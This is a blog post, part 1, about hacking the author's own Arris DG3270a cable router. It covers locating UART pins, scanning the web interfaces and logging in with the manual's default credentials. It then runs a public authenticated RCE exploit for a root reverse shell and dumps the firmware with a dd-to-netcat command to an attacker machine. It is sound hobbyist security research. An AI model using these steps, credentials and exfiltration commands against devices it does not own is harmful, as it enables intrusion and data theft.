---
title: "A Foray into IoT Hacking: The Arris DG3270a: part 1"
author: "Nate McGraw"
layout: default
---

- [A Foray into IoT Hacking: The Arris DG3270a](#a-foray-into-iot-hacking-the-arris-dg3270a)
  - [Analyzing the Board: Finding Physical Access Points](#analyzing-the-board-finding-physical-access-points)
  - [Connecting to the second UART interface](#connecting-to-the-second-uart-interface)
  - [Other interfaces](#other-interfaces)
  - [Attacks over Ethernet](#attacks-over-ethernet)
  - [Getting a Root Shell and Dumping the Firmware](#getting-a-root-shell-and-dumping-the-firmware)
  - [Modifying the Firmware](#modifying-the-firmware)
  - [To Do:](#to-do)


# A Foray into IoT Hacking: The Arris DG3270a

Having recently completed the Red Team Operator course and achieving the certification, I found myself wanting to get away from network penetration testing for a spell and branch out into an area that I've always found interesting but never really jumped into: the land of IoT hacking. After some research on how to get into the field with minimal investment, I found the [Damn Vulnerable IoT Device](https://github.com/hackervegas001/damn-vulnerable-iot-devices-dvid) which, as far as I can tell, has been abandoned. Thankfully, the project is open source, and I was able to send the Gerber files off to have the PCB printed and there was enough information in the parts list to order suitable components to build one.

While waiting for the components to come in, I got antsy and started eyeing the old router I had sitting in my box of various electronics. I forgot to bring it back to my previous ISP and paid a fee for it, so it's mine now. I'm going to crack it open and see what I can do with it, but first, I need to set an objective. The obvious goal would be to get a root shell but I feel like I haven't truly pwned the device until it's performing actions outside of the ones intended by the manufacturer. In this case, I've decided that animating the various status LEDs will be my goal.

## Analyzing the Board: Finding Physical Access Points

![](/assets/img/IoT/uart.png)

Having taken the plastic shell off of the router, I immediately notice two sets of four contact points, these look suspiciously like UART connection points. UART is a hardware communication protocol that communicates on Tx(transmit) and Rx(receive) pins with the other two pins being for ground and the last one to supply voltage (VCC). Using my multimeter, I touched the black probe to one of the shields for ground and found that one of the pins in each of the set of four had continuity with the ground. I then set the multimeter to DC voltage mode and began reading the voltage coming off of the other pins.

![](/assets/img/IoT/1000009060.jpg)

One of the purposes of UART is to display system debug information so during boot up, there is a lot of noise sent over the Tx pin. The next pin over from ground held a flat 3.3v signal during boot which could either be VCC or Rx. The next pin over had large fluctuations in voltages which is consistent with the Tx pin. Feeling confident that I've found UART, I soldered headers to it and connected it to a UART to USB adapter. A little guess work was involved here, Connecting the Tx pin of the adapter to VCC instead of Rx won't hurt anything, so I took a 50/50 shot and connected to the pin between ground and Rx. I then guessed the default baud rate of 115200 and fired up `picocom` to see that I was able to successfully receive a boot message from the router, and I was able to send input to the device. Hole in one!

![](/assets/img/IoT/1000009062.jpg)

Unfortunately, while I was able to send input to the interface, the SoC was still not processing my input except for sending a ctrl+c which would cause the system to detect that the boot process had been interrupted and restart. Analyzing the output did give a few pieces of interesting information though:

 1. When the boot process is interrupted, an error message is printed: `[ERROR] [ARRIS.INIT(pid=408)]: Failed to disable ATOM UART`. Remember the other set of pins that looked like a UART interface? It looks like there's another SoC onboard that can be interacted through them.
 2. `Debugging disabled, SIGUSR1 to turn on debugging.` It looks like sending a user defined signal will enable debugging. This sounds like it could ddefinitely be beneficial to my cause. I have no way to submit input at the moment though so I'll make a note to check that out in the future.
 3. `L2switch internal MAC: 2c.99.24.eb.94.28` L2switch refers to the OSI model where level 2 is the data link layer and the internal MAC refers to the address for the switch at that level. This tells us that there is a separate internal network that networked components are able to communicate over. We also have a MAC address for the switch. As far as I can tell, there is one Broadcom chip which handles the switching. I wonder what happens if I spoof my MAC and connect.
 4. `[INFO] [ARRIS.DB(pid=404)]: ARRIS MTA Surveillance Port Initialization complete` consider my eyebrows raised.
 5. `Firmware Revision 9.1.103V` information was provided on the firmware and the build date for this revision is 1/21/16. Given how old it is, I should check for known exploits

## Connecting to the second UART interface

I repeated the process from earlier and connected another USB to UART adapter that I had lying around. In the first terminal, I triggered the interrupted boot process reset and watched the output scroll by in the terminal and this time, it is a goldmine of information. We're accessing an Intel Atom environment and the boot up print out gives us a full memory map which will be awesome for when I get a shell to dump the firmware.

The output also gave me some useful networking information, confirming that there is an internal network and providing the IP addresses to use to communicate between the SoCs. Again, this is only useful once a shell has been launched. Logs also indicate that telnet, tftp, and other services are runnning which could be attacked to gain control of the ARM SoC if I get a shell on the ATOM SoC or vice versa.

The most exciting bit of output from this connection by far is: `Please press Enter to activate this console. `. There's a short window of time between that line showing up and input no longer being received. Unfortunately, an RPC error comes from the ARM SoC saying that the console program has not been registered. Earlier in the boot process, I see the following:

```
Press 'Enter' within 0 seconds to disable automatic boot.
Hit a key to start the shell...
```

And I tried everything from spamming the enter key to writing a python script to send the enter key when that line is sent. I also tried targeting the next line with various values being sent. No shell was able to be launch. It looks like Arris has really locked down there UART interfaces which is consistent with the experience of [other users attempting to break into Arris devices.](https://www.reddit.com/r/ReverseEngineering/comments/1a68vq/so_i_got_a_uart_and_cracked_open_an_arris_wbm760a/?solution=cdcf5b299f731e03cdcf5b299f731e03&js_challenge=1&token=7afd7253fec22262ff1c52b1703fe9ec9e3702dd03354513e4d08df66910f551&jsc_orig_r=)

## Other interfaces

Having decided to put UART attacks on the shelf for now, I went to focus on other interfaces. I wasn't able to find an SPI chip and while there are plenty of test points on the board, none of them are organized into groups and I don't have a JTAGulator to brute-force it, so I'll put JTAG on the shelf for now. I'm also not seeing any obvious way to interface with i2c. The only interface left that I can think of is Ethernet.

## Attacks over Ethernet

I started by connecting my computer directly to the router via Ethernet where I was assigned an IP address by the router's dhcp server. I first tried to spoof my MAC address to the ones in the boot up printout which caused me to lose the connection. I tried changing the last bytes of the MAC to keep the vendor the same but avoid collisions and that also did not get me a successful connection, so I reverted my MAC and ran an Nmap scan with some interesting results. 

There are not one, not two, but three web servers running on the router on TCP ports 80, 443, and 8080. The web server hosted on port 80 is a status page for the router where you can also access logs, see version information, etc. Of note on this page is the Advanced tab which asks for a password and the Wireless tab which takes you to the web server on port 8080.

![](/assets/img/IoT/web_interface.png)

After researching that advanced tab, I found that the password is known as the Arris PWoD(Password of the Day) which can be independently generated but does not allow any settings to be changed. Trying to log into the wireless web interface failed with the default credentials of `admin:password`. I found the user manual for the router specifically from the ISP that issued the device and found that the credentials should be `cusadmin:password`.

I was able to use the credentials from the user manual to sign in and at this point, rather than rediscover the wheel with testing the web application for vulnerabilities, I decided to research the firmware version number for publicly available exploits and scored big. [CVE-2022-45701](https://github.com/yerodin/CVE-2022-45701) is an authenticated RCE (Remote Code Execution) on Arris routers with firmware version 9.1.103 which is exactly what I'm dealing with. I verified that there is no nastiness in it, updated the values to target my router's IP and use the non-default credentials, and ran it to catch a reverse shell on my listener!

![](/assets/img/IoT/exploit.png)

## Getting a Root Shell and Dumping the Firmware

Great, I have a shell on the device and I have the # line header that indicates a root shell. In the limited environment that I'm in, there is no `whoami` command but `id` returns 0 which verifies that I am the root user. Despite my high level of access, I don't seem to be able to create new files or make any changes to the file system. I do have unfettered read and execute access though.

Looking at my current level of access, I actually have a pretty clear path forward: I need to find a way to dump the firmware, then I need to find a way to get the file off of the router and back onto my host machine. Once the firmware is on my machine, I should be able to use `binwalk` to extract the filesystem, modify it, and reflash the router with the modified firmware, ideally without bricking the router.

Running busybox shows me that not only do I have `nc` to exfiltrate any files on the router, I also have `dd` to create the backup. Running `fdisk -l` shows me that the storage device is at /dev/mmcblk0. On my attacker machine, I run `nc -l -p 9999 > emmc.bin` and in the reverse shell, I created the backup and sent it over to the attacker computer with `dd if=/dev/mmcblk0 bs=4096 | nc 192.168.0.2 9999`. Once the transfer was complete, I extracted all the data from the bin file with `binwalk -M -e emmc.bin` which will recursively extract all compressed archives for easy browsing.

## Modifying the Firmware

In my attempt to control the LEDs, I need to understand how they work. There are two binaries that appear to be involved with controlling the LEDs: `/usr/sbin/ledd` and `/usr/sbin/ledcfg`. Loading `ledcfg` in Ghidra, it's immediately obvious from the strings that it is loading configuration for the LEDs from a plaintext configuration file. I found a configfuration file at `/etc/docsis/puma5evm_led.conf` which reveals that `ledcfg` is used to define the behavior for each state that the LED can be in. This could be interesting later but for now, I need to know how to set the states and for that, I turn to `ledd` and open it in Ghidra.

I was thinking that changing the behavior of the LEDs was going to be complicated and a way to get some practice in reverse engineering but on both binaries, I've gotten what I need just from reading the usage message:

![](/assets/img/IoT/ledd_config.png)

The `ledd` binary takes a manual mode with the `-m` flag that can be used to individually change the state of the LEDs. I decided to dive into reverse engineering the binary a little anyway to decide how best to handle the behavior change with minimal mess. The binary is run as a daemon and polls various devices for their state and changes the LED state based on what input it gets from the devices. The binary is responsible for several checks to verify that all devices initialized correctly so the best strategy here would be to let the daemon run through its normal startup checks, then kill it and run my own script that makes calls to ledd in manual mode.

Looking at the boot output that was captured over UART, the best place to handle this would be in the `start_cli.sh` script which takes a final step to initialize the locked down CLI. The current plan is to place my script in a volatile place like `/nvram` and modify `start_cli.sh` to first run my LED controlling script and then start the CLI (I should also be able to change the CLI to `sh` which will provide an interactive shell over UART). I can then package a new squashfs to path into the firmware and flash it. Easy right? let's see...

I have two options of file systems to modify from the FW extraction: squashfs-root and squashfs-root-1. The first one appears to be a "known-good" copy of the firmware with dates on all of the files being from 2016 and the dates on squashfs-root-1 are from 2019. I'm going to modify squshfs-root-1 so that I can try to avoid bricking the router if I've missed something. 

## To Do:

Ultimately, the only thing that is left is to get the modified firmware installed on the router. This is easier said than done and will constitute its own blog post. I stated reversing the `sw_dl` binary responsible for handling updates and was able to use the tool to reach out to the TFTP server on my computer to download the update which is a great start but the update needs to be signed with a certificate that is downloaded from an internal IP address and is saved to `/nvram` with a timestamp appended to it so it's not as if I can just drop my own cert and have it be used for verification.

Another possible avenue to go down is accessing the device over telnet or SSH which would drop me into the main CLI which is much more privileged than the busybox environment. I loaded up the `cli` binary in Ghidra and, after some reversing, it looks like I should have a much easier time getting an unauthorized update installed. At the moment, both SSH and telnet are disabled but could be re-enabled through the web interface if I have the Arris PWoD (Password of the Day). This is a well documented security feature in Arris hardware and in previous versions, the seed could be pulled from SNMP(if it wasn't the default one from Arris) and generated using any number of generators based on the date on the router's system clock.

In the case of this router, the well known password generation routine is not getting me access, even when I use the last 4 of the serial number as the seed(which is what it's supposed to be according to the research that I've done). Looking into the binary responsible for handling the password, `adv_pw_cgi`, the seed is pulled from `0x36` and `0x37` of the NVRAM to generate the password. I'll have to find some way to figure out what those values are, and then I should be able to access a full shell over SSH or telnet. 

Another interesting finding was in the `cli` binary which shows that if I create a file at /nvram/fastboot containing the character '1', I can reboot into RDK-B mode which might also grant me more access to sensitive information on the device, however, it's also clear that the device would not be able to go back to normal unless it was put into debug mode and then rebooted. This will also require further research.

One final path forward would be to either modify the CLI binary to not deny me access, load it into the /nvram directory and run it from there. While I'm going down that path, I could also try creating my own binary which would use the libraies already on the system to access the nvram like any other binary and then dumping it to get those values. Modifying the values directly may also worth a shot.

All of this and more in the upcoming part 2 to this post!